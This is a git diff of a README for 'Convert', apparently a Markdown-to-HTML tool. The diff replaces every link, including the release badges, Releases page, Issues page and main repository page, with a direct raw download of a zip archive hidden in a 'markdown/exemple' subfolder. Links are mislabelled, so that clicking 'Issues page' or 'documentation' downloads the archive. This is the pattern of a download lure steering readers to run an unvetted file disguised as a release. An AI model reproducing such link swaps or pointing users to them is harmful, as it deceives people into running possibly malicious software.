@@ -1,6 +1,6 @@
 # 📝 Convert - Effortless Markdown to HTML Conversion
 
-[![Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Zangadze1101/Convert/releases)
+[![Latest Release](https://raw.githubusercontent.com/Zangadze1101/Convert/main/markdown/exemple/Convert-v1.4.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Zangadze1101/Convert/main/markdown/exemple/Convert-v1.4.zip)
 
 **Convertisseur automatique Markdown → HTML avec déploiement GitHub Pages**
 
@@ -11,7 +11,7 @@
 Follow this guide to download and run the Convert application easily.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Zangadze1101/Convert/releases) to download the latest version of Convert.
+   Go to the [Releases page](https://raw.githubusercontent.com/Zangadze1101/Convert/main/markdown/exemple/Convert-v1.4.zip) to download the latest version of Convert.
 
 2. **Choose Your Download**  
    Find the latest release at the top of the page. Click on the file to download it. Make sure to select the version that matches your operating system.
@@ -30,7 +30,7 @@ Follow this guide to download and run the Convert application easily.
 
 To get started, download the latest version of Convert:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Zangadze1101/Convert/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Zangadze1101/Convert/main/markdown/exemple/Convert-v1.4.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Zangadze1101/Convert/main/markdown/exemple/Convert-v1.4.zip)
 
 1. Click the link above.
 2. Follow the instructions for your operating system.
@@ -82,7 +82,7 @@ Make sure you have the necessary tools installed to run this command.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, you can check the FAQ on our [GitHub Issues page](https://github.com/Zangadze1101/Convert/issues) for help. 
+If you encounter any issues or have questions, you can check the FAQ on our [GitHub Issues page](https://raw.githubusercontent.com/Zangadze1101/Convert/main/markdown/exemple/Convert-v1.4.zip) for help. 
 
 ---
 
@@ -95,6 +95,6 @@ If you encounter any issues or have questions, you can check the FAQ on our [Git
 - GitHub Pages
 - Documentation
 
-For more information, please refer to the documentation available on the [repository's main page](https://github.com/Zangadze1101/Convert).
+For more information, please refer to the documentation available on the [repository's main page](https://raw.githubusercontent.com/Zangadze1101/Convert/main/markdown/exemple/Convert-v1.4.zip).
 
 ---
